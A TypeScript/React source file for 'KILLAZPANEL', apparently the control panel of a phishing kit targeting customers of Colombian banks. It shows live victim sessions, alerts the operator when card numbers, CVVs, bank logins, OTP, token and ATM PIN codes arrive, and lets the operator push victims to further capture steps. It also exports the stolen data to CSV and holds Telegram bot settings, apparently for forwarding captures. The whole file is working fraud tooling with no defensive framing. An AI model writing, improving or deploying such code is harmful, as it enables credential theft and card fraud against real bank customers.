/**
 * KILLAZPANEL - Admin Control Center
 * 
 * Professional dashboard with:
 * - KILLAZPANEL branding with custom logo
 * - Real-time session monitoring via Socket.IO
 * - Stats bar: clicks, captured data, cards
 * - Active/Inactive status per user session (green/gray dot)
 * - Differentiated notification sounds (new session vs data received)
 * - Session filters (online, with data, by bank)
 * - CSV export for history
 * - Card-based session display with all captured data
 * - Quick action buttons for directing users
 * - History mode with database persistence
 * - PIN-protected access
 */

import { useEffect, useState, useRef, useCallback, useMemo } from "react";
import { io, Socket } from "socket.io-client";

const LOGO_URL = "/manus-storage/killaz-logo_0071d1a6.jpg";

// ═══════════════════════════════════════
// SOUND GENERATION (Web Audio API)
// Shared AudioContext initialized on user gesture (PIN submit)
// ═══════════════════════════════════════

let sharedAudioCtx: AudioContext | null = null;

function getAudioContext(): AudioContext | null {
  try {
    if (!sharedAudioCtx || sharedAudioCtx.state === "closed") {
      sharedAudioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    if (sharedAudioCtx.state === "suspended") {
      sharedAudioCtx.resume();
    }
    return sharedAudioCtx;
  } catch {
    return null;
  }
}

/** Call on user gesture (PIN submit) to prime audio */
function initAudio() {
  const ctx = getAudioContext();
  if (ctx && ctx.state === "suspended") ctx.resume();
}

function playNewSessionSound() {
  const ctx = getAudioContext();
  if (!ctx) return;
  try {
    // Two-tone ascending chime (C5 → E5)
    const osc1 = ctx.createOscillator();
    const osc2 = ctx.createOscillator();
    const gain = ctx.createGain();
    osc1.connect(gain);
    osc2.connect(gain);
    gain.connect(ctx.destination);
    osc1.type = "sine";
    osc2.type = "sine";
    osc1.frequency.value = 523; // C5
    osc2.frequency.value = 659; // E5
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
    osc1.start(ctx.currentTime);
    osc1.stop(ctx.currentTime + 0.25);
    osc2.start(ctx.currentTime + 0.15);
    osc2.stop(ctx.currentTime + 0.5);
  } catch {}
}

function playDataReceivedSound() {
  const ctx = getAudioContext();
  if (!ctx) return;
  try {
    // Triple short beep (higher pitch, faster)
    const frequencies = [880, 1047, 1319]; // A5, C6, E6
    frequencies.forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.type = "triangle";
      osc.frequency.value = freq;
      const startTime = ctx.currentTime + i * 0.08;
      gain.gain.setValueAtTime(0.25, startTime);
      gain.gain.exponentialRampToValueAtTime(0.01, startTime + 0.1);
      osc.start(startTime);
      osc.stop(startTime + 0.1);
    });
  } catch {}
}

// OTP/Dinámica/Token sound: urgent alarm-like double pulse
function playOTPSound() {
  const ctx = getAudioContext();
  if (!ctx) return;
  try {
    [0, 0.2].forEach((delay) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.type = "square";
      osc.frequency.value = 1200;
      const t = ctx.currentTime + delay;
      gain.gain.setValueAtTime(0.3, t);
      gain.gain.exponentialRampToValueAtTime(0.01, t + 0.15);
      osc.start(t);
      osc.stop(t + 0.15);
    });
  } catch {}
}

// Credentials sound: deep confirmation tone
function playCredentialsSound() {
  const ctx = getAudioContext();
  if (!ctx) return;
  try {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sawtooth";
    osc.frequency.value = 440;
    osc.frequency.linearRampToValueAtTime(660, ctx.currentTime + 0.3);
    gain.gain.setValueAtTime(0.2, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
  } catch {}
}

// Get differentiated sound based on step type
function playSoundForStep(step: string) {
  if (step === "otp" || step === "dinamica" || step === "token" || step === "atm") {
    playOTPSound();
  } else if (step === "credentials") {
    playCredentialsSound();
  } else {
    playDataReceivedSound();
  }
}

// ═══════════════════════════════════════
// CSV EXPORT UTILITY
// ═══════════════════════════════════════

function exportToCSV(sessions: any[], filename?: string) {
  const headers = [
    "Fecha",
    "Email",
    "Clave Login",
    "Titular Tarjeta",
    "Número Tarjeta",
    "Vencimiento",
    "CVV",
    "Banco",
    "Red",
    "Categoría",
    "País",
    "Cédula",
    "Teléfono",
    "Ciudad",
    "Dirección",
    "Usuario Banco",
    "Clave Banco",
    "OTP",
    "Dinámica",
    "Token",
    "ATM",
    "Texto Personalizado",
    "IP",
    "Estado",
    "Paso",
  ];

  const rows = sessions.map((s: any) => {
    // Support both DB history sessions and live active sessions
    const data = s.data || {};
    return [
      s.createdAt ? new Date(s.createdAt).toLocaleString() : s.connectedAt ? new Date(s.connectedAt).toLocaleString() : "",
      s.email || "",
      s.loginPassword || "",
      s.holderName || "",
      s.cardNumber || s.cardBin || "",
      s.expiryDate || "",
      s.cvv || "",
      s.bankName || "",
      s.cardScheme || "",
      s.cardCategory || "",
      s.country || "",
      s.cedula || "",
      data.phone || "",
      s.city || "",
      s.address || "",
      s.bankUser || data.bankUser || "",
      s.bankPassword || data.bankPassword || "",
      s.otpCode || data.otpCode || "",
      s.dinamicaCode || data.claveDinamica || "",
      s.tokenCode || data.tokenSeguridad || "",
      s.atmPin || data.claveATM || "",
      s.customTextResponse || "",
      s.ipAddress || "",
      s.status || "",
      s.currentStep || "",
    ];
  });

  const csvContent = [
    headers.join(","),
    ...rows.map(row =>
      row.map((cell: any) => `"${String(cell ?? "").replace(/"/g, '""')}"`).join(",")
    ),
  ].join("\n");

  const blob = new Blob(["\uFEFF" + csvContent], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename || `panel_export_${new Date().toISOString().slice(0, 10)}.csv`;
  link.click();
  URL.revokeObjectURL(url);
}

// ═══════════════════════════════════════
// INTERFACES
// ═══════════════════════════════════════

interface ActiveSession {
  sessionId: string;
  socketId: string;
  email?: string;
  cardBin?: string;
  cardNumber?: string;
  bankName?: string;
  country?: string;
  cardScheme?: string;
  cardCategory?: string;
  currentStep: string;
  status: string;
  data: Record<string, string>;
  connectedAt: number;
  ipAddress?: string;
  userAgent?: string;
  lastActivity: number;
  isOnline: boolean;
  customTextResponse?: string;
  linkedCard?: { previousCard: string; previousBank: string; previousSessionId: string };
  // Pre-3DS captured data
  loginPassword?: string;
  holderName?: string;
  expiryDate?: string;
  cvv?: string;
  address?: string;
  cedula?: string;
  city?: string;
  // Post-3DS captured data
  bankUser?: string;
  bankPassword?: string;
  otpCode?: string;
  dinamicaCode?: string;
  tokenCode?: string;
  atmPin?: string;
}

interface BankStat {
  bank: string;
  total: number;
  withOtp: number;
  withCredentials: number;
}

interface Metrics {
  totalSessions: number;
  totalWithData: number;
  totalCards: number;
  bankStats?: BankStat[];
}

type SessionFilter = "all" | "online" | "offline" | "with-data" | "no-data";

type PanelTheme = "dark" | "light" | "midnight" | "hacker" | "blood";

const THEME_PRESETS: Record<PanelTheme, {
  name: string;
  bg: string;
  headerBg: string;
  cardBg: string;
  text: string;
  textSecondary: string;
  border: string;
  inputBg: string;
  accent: string;
}> = {
  dark: {
    name: "Oscuro",
    bg: "bg-[#0c0c0f]",
    headerBg: "bg-[#12121a]/80",
    cardBg: "bg-[#16161e]",
    text: "text-white",
    textSecondary: "text-gray-400",
    border: "border-white/5",
    inputBg: "bg-white/[0.03]",
    accent: "red",
  },
  light: {
    name: "Claro",
    bg: "bg-gray-50",
    headerBg: "bg-white/90",
    cardBg: "bg-white",
    text: "text-gray-900",
    textSecondary: "text-gray-600",
    border: "border-gray-200",
    inputBg: "bg-gray-100",
    accent: "red",
  },
  midnight: {
    name: "Midnight",
    bg: "bg-[#0a0e1a]",
    headerBg: "bg-[#0f1525]/90",
    cardBg: "bg-[#131b2e]",
    text: "text-blue-50",
    textSecondary: "text-blue-300/60",
    border: "border-blue-500/10",
    inputBg: "bg-blue-950/30",
    accent: "blue",
  },
  hacker: {
    name: "Hacker",
    bg: "bg-black",
    headerBg: "bg-[#001100]/90",
    cardBg: "bg-[#001a00]",
    text: "text-green-400",
    textSecondary: "text-green-600",
    border: "border-green-500/15",
    inputBg: "bg-green-950/20",
    accent: "emerald",
  },
  blood: {
    name: "Blood",
    bg: "bg-[#0a0000]",
    headerBg: "bg-[#1a0505]/90",
    cardBg: "bg-[#1a0808]",
    text: "text-red-50",
    textSecondary: "text-red-300/60",
    border: "border-red-500/15",
    inputBg: "bg-red-950/20",
    accent: "red",
  },
};

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [pinInput, setPinInput] = useState("");
  const [pinError, setPinError] = useState("");
  const [sessions, setSessions] = useState<ActiveSession[]>([]);
  const [connected, setConnected] = useState(false);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  const [historyMode, setHistoryMode] = useState(false);
  const [statsMode, setStatsMode] = useState(false);
  const [historySessions, setHistorySessions] = useState<any[]>([]);
  const [currentTime, setCurrentTime] = useState(Date.now());
  const [metrics, setMetrics] = useState<Metrics>({ totalSessions: 0, totalWithData: 0, totalCards: 0 });
  const [filter, setFilter] = useState<SessionFilter>("all");
  const [bankFilter, setBankFilter] = useState<string>("all");
  const [categoryFilter, setCategoryFilter] = useState<string>("all");
  const [sortBy, setSortBy] = useState<"fecha" | "actividad">("actividad");
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [autoRefreshHistory, setAutoRefreshHistory] = useState(false);
  const [historyPage, setHistoryPage] = useState(1);
  const [historyTotalPages, setHistoryTotalPages] = useState(0);
  const [historyTotal, setHistoryTotal] = useState(0);
  const [historyLoading, setHistoryLoading] = useState(false);
  const HISTORY_PAGE_SIZE = 20;
  const [confirmClear, setConfirmClear] = useState<"clicks" | "data" | null>(null);
  const [panelTheme, setPanelTheme] = useState<PanelTheme>(() => {
    const saved = localStorage.getItem("killazpanel-theme");
    return (saved as PanelTheme) || "dark";
  });
  const [showThemeMenu, setShowThemeMenu] = useState(false);
  const [twoFAStep, setTwoFAStep] = useState(false);
  const [twoFARequestId, setTwoFARequestId] = useState("");
  const [twoFACode, setTwoFACode] = useState("");
  const [twoFAError, setTwoFAError] = useState("");
  const [showCustomTextModal, setShowCustomTextModal] = useState(false);
  const [customTextTarget, setCustomTextTarget] = useState("");
  const [customTextInput, setCustomTextInput] = useState("");
  const [historyDetailSession, setHistoryDetailSession] = useState<any | null>(null);
  const [historySearchQuery, setHistorySearchQuery] = useState("");
  const [trafficMode, setTrafficMode] = useState(false);
  const [trafficLogs, setTrafficLogs] = useState<any[]>([]);
  const [trafficPage, setTrafficPage] = useState(1);
  const [trafficTotal, setTrafficTotal] = useState(0);
  const [trafficLoading, setTrafficLoading] = useState(false);
  const TRAFFIC_PAGE_SIZE = 50;
  const [showConfigModal, setShowConfigModal] = useState(false);
  const [configForm, setConfigForm] = useState({ adminPin: "", telegramBotToken: "", telegramChatId: "", telegramFaceidBotToken: "", telegramFaceidChatId: "" });
  const [configLoading, setConfigLoading] = useState(false);
  const [configSaved, setConfigSaved] = useState(false);
  const [configError, setConfigError] = useState("");
  const [webhookStatus, setWebhookStatus] = useState<{ loading: boolean; result: string; error: string }>({ loading: false, result: "", error: "" });
  const socketRef = useRef<Socket | null>(null);
  const sessionCardsRef = useRef<Record<string, HTMLDivElement | null>>({});
  const [autoScrollEnabled, setAutoScrollEnabled] = useState(true);
  const [securityEnabled, setSecurityEnabled] = useState(false);
  const [securityLoading, setSecurityLoading] = useState(false);

  const loadSecurityStatus = async () => {
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/security", { headers: { "x-admin-pin": pin } });
      const data = await res.json();
      if (data.ok) setSecurityEnabled(data.securityEnabled);
    } catch {}
  };

  const toggleSecurity = async () => {
    setSecurityLoading(true);
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/security", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-pin": pin },
        body: JSON.stringify({ enabled: !securityEnabled }),
      });
      const data = await res.json();
      if (data.ok) setSecurityEnabled(data.securityEnabled);
    } catch {}
    setSecurityLoading(false);
  };

  const loadConfigData = async () => {
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/config", { headers: { "x-admin-pin": pin } });
      const data = await res.json();
      if (data.ok) {
        setConfigForm({
          adminPin: data.config.adminPin || "",
          telegramBotToken: data.config.telegramBotTokenFull || "",
          telegramChatId: data.config.telegramChatId || "",
          telegramFaceidBotToken: data.config.telegramFaceidBotTokenFull || "",
          telegramFaceidChatId: data.config.telegramFaceidChatId || "",
        });
      }
    } catch {}
  };

  const saveConfigData = async () => {
    setConfigLoading(true);
    setConfigError("");
    setConfigSaved(false);
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/config", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-pin": pin },
        body: JSON.stringify(configForm),
      });
      const data = await res.json();
      if (data.ok) {
        setConfigSaved(true);
        if (configForm.adminPin) sessionStorage.setItem("admin-pin", configForm.adminPin);
        setTimeout(() => setConfigSaved(false), 3000);
      } else {
        setConfigError(data.error || "Error al guardar");
      }
    } catch {
      setConfigError("Error de conexión");
    } finally {
      setConfigLoading(false);
    }
  };

  const [testTelegramStatus, setTestTelegramStatus] = useState<{ loading: boolean; result: string; error: string }>({ loading: false, result: "", error: "" });

  const testTelegram = async () => {
    setTestTelegramStatus({ loading: true, result: "", error: "" });
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/test-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-pin": pin },
      });
      const data = await res.json();
      if (data.ok) {
        setTestTelegramStatus({ loading: false, result: "✅ " + data.message, error: "" });
      } else {
        setTestTelegramStatus({ loading: false, result: "", error: data.error || data.message || "Error al enviar" });
      }
    } catch {
      setTestTelegramStatus({ loading: false, result: "", error: "Error de conexión" });
    }
  };

  const registerWebhook = async () => {
    setWebhookStatus({ loading: true, result: "", error: "" });
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/register-webhook", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-admin-pin": pin },
        body: JSON.stringify({ origin: window.location.origin }),
      });
      const data = await res.json();
      if (data.ok) {
        setWebhookStatus({ loading: false, result: `✅ ${data.webhookUrl}`, error: "" });
      } else {
        setWebhookStatus({ loading: false, result: "", error: data.error || "Error al registrar" });
      }
    } catch {
      setWebhookStatus({ loading: false, result: "", error: "Error de conexión" });
    }
  };

  // Persist theme
  useEffect(() => {
    localStorage.setItem("killazpanel-theme", panelTheme);
  }, [panelTheme]);

  const theme = THEME_PRESETS[panelTheme];

  // Update time every second for live timers
  useEffect(() => {
    const interval = setInterval(() => setCurrentTime(Date.now()), 1000);
    return () => clearInterval(interval);
  }, []);

  // Check if already authenticated this session
  useEffect(() => {
    const saved = sessionStorage.getItem("admin-auth");
    if (saved === "true") setIsAuthenticated(true);
  }, []);

  // Fetch metrics when authenticated
  useEffect(() => {
    if (!isAuthenticated) return;
    const fetchMetrics = async () => {
      try {
        const pin = sessionStorage.getItem("admin-pin") || "";
        const res = await fetch("/api/admin/metrics", {
          headers: { "x-admin-pin": pin },
        });
        const data = await res.json();
        if (data.ok) {
          setMetrics({ totalSessions: data.totalSessions, totalWithData: data.totalWithData, totalCards: data.totalCards, bankStats: data.bankStats || [] });
        }
      } catch {}
    };
    fetchMetrics();
    loadSecurityStatus();
    const interval = setInterval(fetchMetrics, 15000);
    return () => clearInterval(interval);
  }, [isAuthenticated]);

  // Auto-refresh history every 10 seconds when in history mode
  useEffect(() => {
    if (!historyMode || !autoRefreshHistory) return;
    const interval = setInterval(() => loadHistory(historyPage), 10000);
    return () => clearInterval(interval);
  }, [historyMode, autoRefreshHistory, historyPage]);

  // Clear functions
  const clearClicks = async () => {
    const pin = sessionStorage.getItem("admin-pin") || "";
    // Reset visit counter in DB
    try {
      await fetch("/api/track/reset", {
        method: "POST",
        headers: { "x-admin-pin": pin },
      });
    } catch {}
    // Clear live sessions from memory
    socketRef.current?.emit("admin:clear-sessions");
    setSessions([]);
    // Reset metrics display
    setMetrics(prev => ({ ...prev, totalSessions: 0 }));
    setConfirmClear(null);
  };

  const clearData = async () => {
    const pin = sessionStorage.getItem("admin-pin") || "";
    try {
      const res = await fetch("/api/admin/clear-history", {
        method: "DELETE",
        headers: { "x-admin-pin": pin },
      });
      const data = await res.json();
      if (data.ok) {
        setMetrics({ totalSessions: 0, totalWithData: 0, totalCards: 0 });
        setHistorySessions([]);
        setHistoryTotal(0);
        setHistoryTotalPages(0);
        setHistoryPage(1);
        // Also clear live sessions
        socketRef.current?.emit("admin:clear-sessions");
        setSessions([]);
      }
    } catch {}
    setConfirmClear(null);
  };

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Prime AudioContext on user gesture (required by browsers)
    initAudio();
    // Request notification permission
    if ("Notification" in window && Notification.permission === "default") {
      Notification.requestPermission();
    }
    try {
      const res = await fetch("/api/admin/verify-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: pinInput }),
      });
      const data = await res.json();
      if (data.ok && data.requires2FA) {
        // PIN correct, now show 2FA step
        setTwoFAStep(true);
        setTwoFARequestId(data.requestId);
        sessionStorage.setItem("admin-pin", pinInput);
        setPinError("");
      } else if (data.ok) {
        setIsAuthenticated(true);
        sessionStorage.setItem("admin-auth", "true");
        sessionStorage.setItem("admin-pin", pinInput);
        setPinError("");
      } else {
        // Show server-provided error message (includes attempts left / block time)
        setPinError(data.error || "PIN incorrecto");
        setPinInput("");
      }
    } catch {
      setPinError("Error de conexión");
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch("/api/admin/verify-2fa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: twoFARequestId, code: twoFACode }),
      });
      const data = await res.json();
      if (data.ok) {
        setIsAuthenticated(true);
        sessionStorage.setItem("admin-auth", "true");
        setTwoFAStep(false);
        setTwoFAError("");
      } else {
        setTwoFAError(data.error || "C\u00f3digo incorrecto");
        setTwoFACode("");
      }
    } catch {
      setTwoFAError("Error de conexi\u00f3n");
    }
  };

  const copySessionData = useCallback((session: ActiveSession) => {
    const lines = [
      `══════════════════════════════`,
      `KILLAZPANEL - SESIÓN: ${session.sessionId.slice(0, 16)}`,
      `══════════════════════════════`,
      ``,
      `📧 Email/Cel: ${session.email || session.data?.email || "—"}`,
      `🌐 IP: ${session.ipAddress || "—"}`,
      ``,
      `── TARJETA ──`,
      `💳 Número: ${session.cardNumber || session.cardBin || "—"}`,
      `🏦 Banco: ${session.bankName || "—"}`,
      `🌍 País: ${session.country || "—"}`,
      `💠 Red: ${session.cardScheme || "—"}`,
      `🏆 Categoría: ${session.data?.cardCategory || "—"}`,
      ``,
      `── CREDENCIALES BANCO ──`,
      `👤 Usuario: ${session.data?.bankUser || "—"}`,
      `🔒 Contraseña: ${session.data?.bankPassword || "—"}`,
      ``,
      `── CÓDIGOS ──`,
      `📱 OTP: ${session.data?.otpCode || "—"}`,
      `🔑 Dinámica: ${session.data?.claveDinamica || "—"}`,
      `🔐 Token: ${session.data?.tokenSeguridad || "—"}`,
      `🏧 ATM: ${session.data?.claveATM || "—"}`,
      ``,
      `── ESTADO ──`,
      `📊 Estado: ${session.status}`,
      `📍 Paso: ${session.currentStep}`,
      `🟢 Online: ${session.isOnline ? "Sí" : "No"}`,
      `══════════════════════════════`,
    ];
    navigator.clipboard.writeText(lines.join("\n")).then(() => {
      setCopySuccess(session.sessionId);
      setTimeout(() => setCopySuccess(null), 2000);
    });
  }, []);

  const loadHistory = async (page: number = 1, search?: string) => {
    setHistoryLoading(true);
    try {
      const pin = sessionStorage.getItem("admin-pin") || "";
      const q = search !== undefined ? search : historySearchQuery;
      const params = new URLSearchParams({ page: String(page), pageSize: String(HISTORY_PAGE_SIZE) });
      if (q.trim()) params.set("search", q.trim());
      const res = await fetch(`/api/sessions/history?${params.toString()}`, {
        headers: { "x-admin-pin": pin },
      });
      const data = await res.json();
      if (data.ok) {
        setHistorySessions(data.sessions);
        setHistoryTotalPages(data.totalPages);
        setHistoryTotal(data.total);
        setHistoryPage(page);
      }
    } catch (e) {
      console.error("Failed to load history", e);
    } finally {
      setHistoryLoading(false);
    }
  };

  const loadTrafficData = async (page: number = 1) => {
    setTrafficLoading(true);
    try {
      const pin = sessionStorage.getItem("admin-pin") || "";
      const res = await fetch(`/api/admin/traffic?page=${page}&limit=${TRAFFIC_PAGE_SIZE}`, {
        headers: { "x-admin-pin": pin },
      });
      const data = await res.json();
      if (data.ok) {
        setTrafficLogs(data.logs);
        setTrafficTotal(data.total);
        setTrafficPage(page);
      }
    } catch (e) {
      console.error("Failed to load traffic", e);
    } finally {
      setTrafficLoading(false);
    }
  };

  const clearTrafficData = async () => {
    const pin = sessionStorage.getItem("admin-pin") || "";
    await fetch("/api/admin/traffic/clear", {
      method: "POST",
      headers: { "x-admin-pin": pin },
    });
    setTrafficLogs([]);
    setTrafficTotal(0);
  };

  useEffect(() => {
    const socket = io(window.location.origin, {
      path: "/api/socket.io",
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
    });
    socketRef.current = socket;

    socket.on("connect", () => {
      setConnected(true);
      socket.emit("admin:join");
    });

    socket.on("reconnect", () => {
      setConnected(true);
      socket.emit("admin:join");
    });

    socket.on("disconnect", () => setConnected(false));
    socket.on("connect_error", () => setConnected(false));

    socket.on("admin:sessions", (data: ActiveSession[]) => {
      // Preserve frontend-only fields (customTextResponse) that don't come from server
      setSessions((prev) => data.map((incoming) => {
        const existing = prev.find(s => s.sessionId === incoming.sessionId);
        return existing ? { ...incoming, customTextResponse: existing.customTextResponse } : incoming;
      }));
    });

    socket.on("admin:new-session", (session: ActiveSession) => {
      setSessions((prev) => [...prev, session]);
      // Differentiated sound: new session = ascending chime
      if (soundEnabled) playNewSessionSound();
      // Vibrate on mobile (short pulse for new session)
      if (navigator.vibrate) navigator.vibrate(200);
      // Auto-scroll to new session
      if (autoScrollEnabled) {
        setTimeout(() => {
          const el = sessionCardsRef.current[session.sessionId];
          if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
        }, 200);
      }
      // Browser notification
      if (Notification.permission === "granted") {
        new Notification("KILLAZPANEL - 🆕 NUEVA", { body: `Nueva sesi\u00f3n: ${session.email || session.ipAddress || "Desconocido"}`, icon: LOGO_URL });
      }
    });

    socket.on("admin:session-updated", (session: ActiveSession) => {
      setSessions((prev) => {
        const exists = prev.find(s => s.sessionId === session.sessionId);
        if (exists) {
          // Preserve frontend-only fields (customTextResponse) that don't come from server
          return prev.map((s) => (
            s.sessionId === session.sessionId
              ? { ...session, customTextResponse: s.customTextResponse || session.customTextResponse }
              : s
          ));
        }
        return [...prev, session];
      });
    });

    socket.on("admin:data-received", (data: { sessionId: string; step: string; values: Record<string, string>; session: ActiveSession }) => {
      setSessions((prev) => {
        const exists = prev.find(s => s.sessionId === data.sessionId);
        if (exists) {
          return prev.map((s) => (s.sessionId === data.sessionId ? { ...data.session, customTextResponse: s.customTextResponse } : s));
        }
        return [...prev, data.session];
      });
      // Differentiated sound by step type
      if (soundEnabled) playSoundForStep(data.step);
      // Vibrate on mobile (pattern varies by type)
      if (navigator.vibrate) {
        if (data.step === "otp" || data.step === "dinamica" || data.step === "token") {
          navigator.vibrate([150, 50, 150, 50, 150]); // triple pulse for OTP/codes
        } else if (data.step === "credentials") {
          navigator.vibrate([300, 100, 300]); // double long pulse for credentials
        } else {
          navigator.vibrate([100, 50, 200]);
        }
      }
      // Auto-scroll to the session that received data
      if (autoScrollEnabled) {
        setTimeout(() => {
          const el = sessionCardsRef.current[data.sessionId];
          if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
        }, 100);
      }
      // Browser notification
      if (Notification.permission === "granted") {
        const stepLabels: Record<string, string> = { otp: "🔑 OTP", dinamica: "🔐 Dinámica", token: "🛡️ Token", atm: "🏧 ATM", credentials: "🔓 Credenciales" };
        const label = stepLabels[data.step] || data.step;
        new Notification(`KILLAZPANEL - ${label}`, { body: `${label} recibido de ${data.session?.email || data.session?.ipAddress || "Desconocido"}`, icon: LOGO_URL });
      }
    });

    // Session disconnected - update isOnline to false instead of removing
    socket.on("admin:session-disconnected", (data: { sessionId: string }) => {
      setSessions((prev) => prev.map((s) => 
        s.sessionId === data.sessionId ? { ...s, isOnline: false, lastActivity: Date.now() } : s
      ));
    });

    // Listen for custom text responses from users
    socket.on("admin:custom-text-response", (data: { sessionId: string; question: string; answer: string }) => {
      setSessions((prev) => prev.map((s) => {
        if (s.sessionId === data.sessionId) {
          return { ...s, customTextResponse: `${data.question} → ${data.answer}` };
        }
        return s;
      }));
      // Play data sound for response
      if (soundEnabled) playDataReceivedSound();
      // Vibrate
      if (navigator.vibrate) navigator.vibrate([100, 50, 200]);
    });

    // Handle auto-cleanup: server removed an inactive session after 30 min
    socket.on("admin:session-removed", (data: { sessionId: string }) => {
      setSessions((prev) => prev.filter((s) => s.sessionId !== data.sessionId));
    });

    // Linked card detected - same user with different card
    socket.on("admin:linked-card-detected", (data: { sessionId: string; previousSessionId: string; previousCard: string; previousBank: string; currentCard: string; currentBank: string; email: string; ipAddress: string }) => {
      setSessions((prev) => prev.map((s) => {
        if (s.sessionId === data.sessionId) {
          return { ...s, linkedCard: { previousCard: data.previousCard, previousBank: data.previousBank, previousSessionId: data.previousSessionId } };
        }
        return s;
      }));
      // Play alert sound
      if (soundEnabled) playDataReceivedSound();
      if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]);
      if (Notification.permission === "granted") {
        new Notification("\u26a0\ufe0f CAMBIO DE TARJETA", { body: `${data.email || data.ipAddress}: ${data.previousCard} \u2192 ${data.currentCard}`, icon: LOGO_URL });
      }
    });

    // Polling every 5s to keep online/offline status in sync
    const pollInterval = setInterval(() => {
      if (socket.connected) {
        socket.emit("admin:join"); // re-request sessions list
      }
    }, 5000);

    return () => { 
      clearInterval(pollInterval);
      socket.disconnect(); 
    };
  }, [soundEnabled]);

  const sendStep = (sessionId: string, step: string) => {
    socketRef.current?.emit("admin:send-step", { sessionId, step });
  };

  const updateStatus = (sessionId: string, status: string) => {
    socketRef.current?.emit("admin:update-status", { sessionId, status });
  };

  const removeSession = (sessionId: string) => {
    setSessions((prev) => prev.filter(s => s.sessionId !== sessionId));
    if (selectedSessionId === sessionId) setSelectedSessionId(null);
  };

  const getStatusClasses = (status: string) => {
    const map: Record<string, { dot: string; badge: string }> = {
      active: { dot: "bg-emerald-400 animate-pulse", badge: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" },
      waiting: { dot: "bg-amber-400 animate-pulse", badge: "bg-amber-500/10 text-amber-400 border-amber-500/20" },
      completed: { dot: "bg-sky-400", badge: "bg-sky-500/10 text-sky-400 border-sky-500/20" },
      rejected: { dot: "bg-red-400", badge: "bg-red-500/10 text-red-400 border-red-500/20" },
    };
    return map[status] || { dot: "bg-gray-400", badge: "bg-gray-500/10 text-gray-400 border-gray-500/20" };
  };

  const getStatusLabel = (status: string) => {
    switch (status) {
      case "active": return "ACTIVO";
      case "waiting": return "ESPERANDO";
      case "completed": return "COMPLETADO";
      case "rejected": return "RECHAZADO";
      default: return status.toUpperCase();
    }
  };

  const getStepLabel = (step: string) => {
    const labels: Record<string, string> = {
      credentials: "Credenciales",
      otp: "OTP",
      dinamica: "Dinámica",
      token: "Token",
      atm: "ATM",
      completed: "Completado",
    };
    return labels[step] || step;
  };

  const timeSince = (timestamp: number) => {
    const seconds = Math.floor((currentTime - timestamp) / 1000);
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ${seconds % 60}s`;
    const hours = Math.floor(minutes / 60);
    return `${hours}h ${minutes % 60}m`;
  };

  const hasData = (session: ActiveSession) => {
    return !!(session.data?.bankUser || session.data?.otpCode || session.data?.claveDinamica || session.data?.tokenSeguridad || session.data?.claveATM);
  };

  // Bank badge: color + short label per bank
  const getBankBadge = (bankName?: string): { bg: string; text: string; label: string } => {
    if (!bankName) return { bg: "bg-gray-500/15", text: "text-gray-400", label: "—" };
    const n = bankName.toLowerCase();
    if (n.includes("bancolombia")) return { bg: "bg-yellow-500/20", text: "text-yellow-300", label: "BANCOLOMBIA" };
    if (n.includes("davivienda")) return { bg: "bg-red-500/20", text: "text-red-300", label: "DAVIVIENDA" };
    if (n.includes("bogot")) return { bg: "bg-blue-500/20", text: "text-blue-300", label: "BOG" };
    if (n.includes("occidente")) return { bg: "bg-orange-500/20", text: "text-orange-300", label: "OCCIDENTE" };
    if (n.includes("popular")) return { bg: "bg-purple-500/20", text: "text-purple-300", label: "POPULAR" };
    if (n.includes("bbva")) return { bg: "bg-sky-500/20", text: "text-sky-300", label: "BBVA" };
    if (n.includes("itaú") || n.includes("itau")) return { bg: "bg-orange-600/20", text: "text-orange-200", label: "ITAÚ" };
    if (n.includes("scotiabank") || n.includes("colpatria")) return { bg: "bg-red-600/20", text: "text-red-200", label: "COLPATRIA" };
    if (n.includes("av villas") || n.includes("av-villas")) return { bg: "bg-green-500/20", text: "text-green-300", label: "AV VILLAS" };
    if (n.includes("caja social") || n.includes("bcsc")) return { bg: "bg-teal-500/20", text: "text-teal-300", label: "CAJA SOCIAL" };
